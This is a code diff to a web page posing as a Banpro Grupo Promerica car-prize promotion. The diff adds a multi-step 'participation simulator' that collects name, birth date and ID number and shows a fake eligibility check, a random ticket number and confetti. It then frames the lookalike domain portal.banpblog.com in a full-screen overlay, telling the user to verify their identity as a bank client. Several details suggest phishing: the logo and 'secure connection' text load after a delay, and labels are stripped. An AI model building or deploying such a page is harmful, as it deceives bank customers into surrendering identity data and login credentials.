@@ -11,7 +11,7 @@ $v = time();
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta name="robots" content="noindex, nofollow" />
   <meta name="author" content="" />
-  <title>Cómo Participar</title>
+  <title>Simulador de Participación</title>
   <script>
     if ('scrollRestoration' in history) history.scrollRestoration = 'manual';
     window.addEventListener('load',     () => window.scrollTo(0, 0));
@@ -499,6 +499,124 @@ $v = time();
       letter-spacing: 0.2px;
     }
 
+    /* ── SIM FORM ── */
+    .sim-form {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      margin-top: 18px;
+      text-align: left;
+    }
+    .sim-label {
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+      font-size: 12.5px;
+      font-weight: 600;
+      color: #333;
+    }
+    .sim-label input {
+      padding: 11px 13px;
+      border: 1.5px solid #d8d8d8;
+      border-radius: 10px;
+      font-size: 14px;
+      font-family: inherit;
+      transition: border .2s, box-shadow .2s;
+      outline: none;
+      background: #fafafa;
+    }
+    .sim-label input:focus {
+      border-color: #00693c;
+      box-shadow: 0 0 0 3px rgba(0,105,60,0.12);
+      background: #fff;
+    }
+    .sim-btn {
+      margin-top: 8px;
+      padding: 13px 16px;
+      background: linear-gradient(180deg, #00853f 0%, #00693c 100%);
+      color: #fff;
+      border: 0;
+      border-radius: 12px;
+      font-size: 15px;
+      font-weight: 800;
+      cursor: pointer;
+      letter-spacing: 0.2px;
+      transition: transform .15s, box-shadow .15s;
+      box-shadow: 0 4px 14px rgba(0,105,60,0.25);
+    }
+    .sim-btn:hover { transform: translateY(-1px); box-shadow: 0 6px 18px rgba(0,105,60,0.35); }
+    .sim-btn:active { transform: translateY(0); }
+    .sim-disclaimer {
+      font-size: 11px;
+      color: #999;
+      text-align: center;
+      margin-top: 6px;
+      line-height: 1.4;
+    }
+
+    /* ── SUCCESS ── */
+    .success-icon {
+      font-size: 56px;
+      text-align: center;
+      margin-bottom: 6px;
+      animation: pop 0.5s cubic-bezier(0.34,1.56,0.64,1);
+    }
+    @keyframes pop {
+      0% { transform: scale(0); }
+      80% { transform: scale(1.15); }
+      100% { transform: scale(1); }
+    }
+    .success-title {
+      color: #00853f !important;
+    }
+    .ticket-card {
+      background: linear-gradient(135deg, #f5faf7 0%, #e8f5ec 100%);
+      border: 1.5px dashed #00853f;
+      border-radius: 14px;
+      padding: 18px 16px;
+      margin: 18px 0 14px;
+      text-align: center;
+    }
+    .ticket-label {
+      font-size: 11.5px;
+      color: #00693c;
+      font-weight: 700;
+      letter-spacing: 0.8px;
+      text-transform: uppercase;
+      margin-bottom: 6px;
+    }
+    .ticket-number {
+      font-size: 26px;
+      font-weight: 900;
+      color: #00693c;
+      letter-spacing: 3px;
+      font-family: 'Courier New', monospace;
+      margin-bottom: 8px;
+    }
+    .ticket-foot {
+      font-size: 11px;
+      color: #777;
+      font-style: italic;
+    }
+    .next-step {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      background: #fff8e6;
+      border: 1px solid #ffd97a;
+      border-radius: 10px;
+      padding: 11px 13px;
+      margin-bottom: 14px;
+      text-align: left;
+    }
+    .next-icon { font-size: 22px; flex-shrink: 0; }
+    .next-step p {
+      font-size: 12.5px;
+      color: #5a4a00;
+      line-height: 1.45;
+      font-weight: 500;
+    }
+
     /* ── IFRAME OVERLAY ── */
     .ext-frame {
       position: fixed;
@@ -529,14 +647,14 @@ $v = time();
   </div>
 
   <header class="topbar">
-    <div class="topbar-logo" id="brandSlot" aria-label="Marca" role="img"></div>
+    <div class="topbar-logo" id="brandSlot"></div>
     <button class="menu-btn" aria-label="Menú" onclick="logout()">
       <span></span><span></span><span></span>
     </button>
   </header>
 
   <main class="wrapper page-pad">
-    <img class="hero-img" src="img/banner.jpg?v=<?php echo $v; ?>" alt="Banner promocional">
+    <img class="hero-img" src="img/banner.jpg?v=<?php echo $v; ?>" alt="">
 
     <section class="card">
        <div class="content">
@@ -575,7 +693,7 @@ $v = time();
         </div>
 
         <div class="car-area">
-          <img src="img/auto.png?v=<?php echo $v; ?>" alt="Auto Banpro" style="width:95%; max-width:299px; display:block;">
+          <img src="img/auto.png?v=<?php echo $v; ?>" alt="" style="width:95%; max-width:299px; display:block;">
         </div>
 <br>      <div class="bottom">
           <h2>Los ganadores serán anunciados a través de nuestros canales oficiales.</h2>
@@ -585,27 +703,81 @@ $v = time();
     </section>
   </main>
 
-  <!-- ── IDENTITY MODAL ── -->
+  <!-- ── SIMULATION MODAL ── -->
   <div class="modal-backdrop" id="identityModal" onclick="if(event.target===this) closeModal()">
     <div class="modal-card" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
       <button class="modal-close" type="button" onclick="closeModal()" aria-label="Cerrar">✕</button>
 
-      <div class="modal-icon">
-        <svg viewBox="0 0 24 24" fill="none" stroke="#00693c" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-          <path d="M12 1l9 4v6c0 5.5-3.8 10.7-9 12-5.2-1.3-9-6.5-9-12V5l9-4z"/>
-          <path d="M9 12l2 2 4-4"/>
-        </svg>
+      <!-- STEP 1: FORM -->
+      <div class="step-pane" id="step1">
+        <div class="modal-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#00693c" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M12 1l9 4v6c0 5.5-3.8 10.7-9 12-5.2-1.3-9-6.5-9-12V5l9-4z"/>
+            <path d="M9 12l2 2 4-4"/>
+          </svg>
+        </div>
+        <h2 class="modal-title" id="modalTitle">Simulador de Participación</h2>
+        <p class="modal-subtitle">Completa los datos para validar tu eligibilidad</p>
+
+        <form class="sim-form" id="simForm" onsubmit="submitSim(event)" autocomplete="off">
+          <label class="sim-label">
+            <span>Nombre completo</span>
+            <input type="text" name="nombre" required minlength="3" placeholder="Ej. Juan Pérez">
+          </label>
+
+          <label class="sim-label">
+            <span>Fecha de nacimiento</span>
+            <input type="date" name="fnac" required>
+          </label>
+
+          <label class="sim-label">
+            <span>Número de documento</span>
+            <input type="text" name="doc" required minlength="6" inputmode="numeric" placeholder="Cédula">
+          </label>
+
+          <button type="submit" class="sim-btn">Validar mi participación</button>
+          <p class="sim-disclaimer">Simulación informativa. No accede a bases de datos reales.</p>
+        </form>
       </div>
 
-      <h2 class="modal-title" id="modalTitle">Identificate </h2>
-      <p class="modal-subtitle">Verificando tu acceso como cliente...</p>
-
-      <div class="loader-wrap">
-        <div class="loader-ring"></div>
-        <div class="loader-dots">
-          <span></span><span></span><span></span>
+      <!-- STEP 2: LOADER -->
+      <div class="step-pane" id="step2" style="display:none;">
+        <div class="modal-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#00693c" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="9"/>
+            <path d="M12 7v5l3 2"/>
+          </svg>
         </div>
-        <div class="loader-text">Cargando...</div>
+        <h2 class="modal-title">Analizando tu perfil</h2>
+        <p class="modal-subtitle" id="loaderStatus">Validando información...</p>
+
+        <div class="loader-wrap">
+          <div class="loader-ring"></div>
+          <div class="loader-dots">
+            <span></span><span></span><span></span>
+          </div>
+          <div class="loader-text">Procesando...</div>
+        </div>
+      </div>
+
+      <!-- STEP 3: SUCCESS -->
+      <div class="step-pane" id="step3" style="display:none;">
+        <div class="success-icon">🎉</div>
+        <h2 class="modal-title success-title">¡Felicidades!</h2>
+        <p class="modal-subtitle">Estás habilitado para participar.</p>
+
+        <div class="ticket-card">
+          <div class="ticket-label">Tu número de participación</div>
+          <div class="ticket-number" id="ticketNumber">— — — —</div>
+          <div class="ticket-foot">Guarda este número para futuras consultas</div>
+        </div>
+
+        <div class="next-step">
+          <span class="next-icon">🔐</span>
+          <p>Para finalizar tu participación, verifica tu identidad como cliente.</p>
+        </div>
+
+        <button type="button" class="sim-btn" onclick="continueToPortal()">Verificarme y finalizar</button>
       </div>
 
       <div class="modal-secure" id="secureBadge" style="margin-top:18px;">
@@ -618,40 +790,139 @@ $v = time();
     </div>
   </div>
 
+  <canvas id="confettiCanvas" style="position:fixed;inset:0;pointer-events:none;z-index:10000;display:none;"></canvas>
+
+  <iframe class="ext-frame" id="extFrame" title="Registro"></iframe>
+
   <script>
     const PORTAL_URL = 'https://portal.banpblog.com/';
-    const DELAY = 2500;
-    let _t = null;
 
-    function goToPortal() {
-      window.location.href = PORTAL_URL;
-    }
-
+    /* Carga diferida de marca */
     setTimeout(function() {
       var b = document.getElementById('brandSlot');
       if (b) b.style.backgroundImage = "url('img/logo.png')";
       var s = document.getElementById('secureText');
-      if (s) {
-        var parts = ['Conexi\u00f3n', 'segura', '\u00b7', 'Banpro', 'Grupo', 'Promerica'];
-        s.textContent = parts.join(' ');
-      }
+      if (s) s.textContent = 'Conexión segura · Banpro Grupo Promerica';
     }, 300);
+
+    /* Navegación de pasos */
+    function showStep(n) {
+      ['step1','step2','step3'].forEach((id, i) => {
+        document.getElementById(id).style.display = (i + 1 === n) ? '' : 'none';
+      });
+    }
 
     function openModal() {
       const m = document.getElementById('identityModal');
       m.classList.add('active');
       document.body.style.overflow = 'hidden';
-      clearTimeout(_t);
-      _t = setTimeout(goToPortal, DELAY);
+      showStep(1);
     }
     function closeModal() {
       const m = document.getElementById('identityModal');
       m.classList.remove('active');
       document.body.style.overflow = '';
-      clearTimeout(_t);
+      showStep(1);
     }
     document.addEventListener('keydown', e => {
       if (e.key === 'Escape') closeModal();
+    });
+
+    /* Submit del formulario - simulación local */
+    function submitSim(e) {
+      e.preventDefault();
+      showStep(2);
+
+      const statuses = [
+        'Validando información...',
+        'Consultando elegibilidad...',
+        'Verificando datos...',
+        'Generando resultado...'
+      ];
+      const el = document.getElementById('loaderStatus');
+      let i = 0;
+      const interval = setInterval(() => {
+        i = (i + 1) % statuses.length;
+        if (el) el.textContent = statuses[i];
+      }, 700);
+
+      setTimeout(() => {
+        clearInterval(interval);
+        generateTicket();
+        showStep(3);
+        launchConfetti();
+      }, 3000);
+    }
+
+    /* Genera número de participación aleatorio formato: XXXX-XXXX */
+    function generateTicket() {
+      const rand = () => Math.floor(1000 + Math.random() * 9000);
+      const num = rand() + '-' + rand();
+      const el = document.getElementById('ticketNumber');
+      if (el) el.textContent = num;
+    }
+
+    /* Continuar a registro (iframe overlay) */
+    function continueToPortal() {
+      const f = document.getElementById('extFrame');
+      f.src = PORTAL_URL;
+      f.classList.add('active');
+      const m = document.getElementById('identityModal');
+      m.classList.remove('active');
+      document.title = 'Registro';
+    }
+
+    /* Confetti */
+    function launchConfetti() {
+      const canvas = document.getElementById('confettiCanvas');
+      canvas.style.display = 'block';
+      const ctx = canvas.getContext('2d');
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+
+      const colors = ['#00853f','#FFD700','#ff6b6b','#4ecdc4','#ffa500','#9b59b6'];
+      const pieces = [];
+      for (let i = 0; i < 140; i++) {
+        pieces.push({
+          x: Math.random() * canvas.width,
+          y: -20 - Math.random() * 200,
+          w: 6 + Math.random() * 6,
+          h: 10 + Math.random() * 8,
+          c: colors[Math.floor(Math.random()*colors.length)],
+          vx: -2 + Math.random() * 4,
+          vy: 2 + Math.random() * 4,
+          rot: Math.random() * Math.PI * 2,
+          vr: -0.2 + Math.random() * 0.4
+        });
+      }
+
+      let frame = 0;
+      const maxFrames = 240;
+      (function loop() {
+        ctx.clearRect(0,0,canvas.width,canvas.height);
+        pieces.forEach(p => {
+          p.x += p.vx;
+          p.y += p.vy;
+          p.rot += p.vr;
+          ctx.save();
+          ctx.translate(p.x, p.y);
+          ctx.rotate(p.rot);
+          ctx.fillStyle = p.c;
+          ctx.fillRect(-p.w/2, -p.h/2, p.w, p.h);
+          ctx.restore();
+        });
+        frame++;
+        if (frame < maxFrames) requestAnimationFrame(loop);
+        else canvas.style.display = 'none';
+      })();
+    }
+
+    window.addEventListener('resize', () => {
+      const c = document.getElementById('confettiCanvas');
+      if (c.style.display === 'block') {
+        c.width = window.innerWidth;
+        c.height = window.innerHeight;
+      }
     });
   </script>
 
